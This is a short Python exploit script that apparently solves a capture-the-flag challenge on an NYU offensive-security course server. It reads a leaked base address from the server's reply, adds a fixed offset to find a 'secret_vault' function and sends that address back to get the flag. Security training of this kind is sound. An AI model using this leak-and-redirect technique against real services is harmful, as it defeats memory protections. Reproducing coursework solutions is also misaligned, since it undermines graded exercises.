import socket
import struct
HOST = 'offsec-chalbroker.osiris.cyber.nyu.edu'
PORT = 1233
NETID = '<NET ID>'
SECRET_VAULT_OFFSET = 0x1269
def connect_to_server():
    """Establish a connection to the server and return the socket."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    return sock
def receive_until(sock, stop_phrase):
    """Receive data from the server until a specific phrase is found."""
    data = b""
    while stop_phrase.encode() not in data:
        data += sock.recv(1024)
    return data
def get_base_address(response):
    """Extract the base address from the server's response."""
    start_index = response.find(b"post-it note:")
    if start_index != -1:
        base_addr_bytes = response[start_index + len("post-it note:") + 1 : start_index + len("post-it note:") + 7]
        base_address = struct.unpack("<Q", base_addr_bytes + b"\x00\x00")[0]
        print(f"Extracted base address: {hex(base_address)}")
        return base_address
    raise ValueError("Base address not found in the server response.")
def calculate_vault_address(base_address, offset):
    """Calculate the actual address of the secret_vault using the base address and offset."""
    return base_address + offset
def main():
    sock = connect_to_server()
    print("Connected to the server.")
    receive_until(sock, "Please input your NetID")
    sock.sendall(f"{NETID}\n".encode())
    print(f"Sent NetID: {NETID}")
    response = receive_until(sock, "Agh!")
    print("Received response from server.")
    base_address = get_base_address(response)
    secret_vault_address = calculate_vault_address(base_address, SECRET_VAULT_OFFSET)
    print(f"Calculated secret_vault address: {hex(secret_vault_address)}")
    sock.sendall(f"{hex(secret_vault_address)}\n".encode())
    print("Sent secret_vault address to the server.")
    flag = receive_until(sock, "flag")
    print(flag.decode())
    sock.close()
if __name__ == "__main__":
    main()
